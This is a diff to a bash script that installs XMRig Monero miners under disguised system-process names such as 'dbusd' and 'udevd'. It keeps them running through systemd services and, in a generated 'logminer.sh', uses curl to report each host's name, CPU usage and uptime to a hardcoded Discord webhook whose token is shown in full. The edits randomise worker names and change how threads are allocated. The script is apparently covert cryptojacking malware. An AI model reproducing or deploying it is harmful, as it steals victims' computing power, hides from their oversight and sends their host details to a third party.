@@ -10,11 +10,14 @@ POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
 # ========== END CONFIG ==========
 
-WORKER1="core_$(hostname)"
-WORKER2="silent_$(hostname)"
-TOTAL_CORES=$(nproc)
-THREADS1=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
-THREADS2=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
+WORKER1="core_$(hostname)_$(shuf -i 1000-9999 -n1)"
+WORKER2="silent_$(hostname)_$(shuf -i 1000-9999 -n1)"
+
+TOTALCORE=$(nproc)
+TOTAL_MINING_THREADS=$TOTALCORE
+THREADS1=$(shuf -i 5-7 -n1)
+THREADS2=$((TOTAL_MINING_THREADS - THREADS1))
+
 PRIORITY=3
 NAME1=$(shuf -n1 -e "dbusd" "syscore" "udevd")
 NAME2=$(shuf -n1 -e "corelogd" "netlog" "sysnet")
@@ -53,7 +56,7 @@ Description=Core Miner Fallback
 After=network.target
 
 [Service]
-ExecStart=$DIR1/$NAME1 -o $POOL -u $KEY.$WORKER1 -k --coin monero --tls \\
+ExecStart=$DIR1/$NAME1 -o $POOL -u $WALLET.$WORKER1 -k --coin monero --tls \\
   --cpu-priority=$PRIORITY --threads=$THREADS1 --donate-level=0 \\
   --max-cpu-usage=65 --log-file=$LOG1
 Restart=always
@@ -68,7 +71,7 @@ Description=Core Miner
 After=network.target
 
 [Service]
-ExecStart=$DIR2/$NAME2 -o $POOL -u $WALLET.$WORKER2 -k --coin monero --tls \\
+ExecStart=$DIR2/$NAME2 -o $POOL -u $KEY.$WORKER2 -k --coin monero --tls \\
   --cpu-priority=$PRIORITY --threads=$THREADS2 --donate-level=0 \\
   --max-cpu-usage=65 --log-file=$LOG2
 Restart=always
@@ -91,12 +94,6 @@ tee "$DIR1/logminer.sh" > /dev/null << EOF
 WEBHOOK="$DISCORD_WEBHOOK"
 PROCESS_NAME="$NAME1"
 HOST="\$(hostname)"
-HASHRATE="Unknown"
-LOG_FILE="$LOG1"
-
-if [ -f "\$LOG_FILE" ]; then
-  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
-fi
 
 CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
 UPTIME=\$(uptime -p)
@@ -104,7 +101,7 @@ THREADS=$THREADS1
 
 curl -s -H "Content-Type: application/json" -X POST -d "{
   \\"username\\": \\"XMRig Status\\",
-  \\"content\\": \\"🖥️ \\\`\$HOST\\\` Connected\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
+  \\"content\\": \\"🖥️ \\\`\$HOST\\\` Connected\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
 }" "\$WEBHOOK" > /dev/null 2>&1
 EOF
 
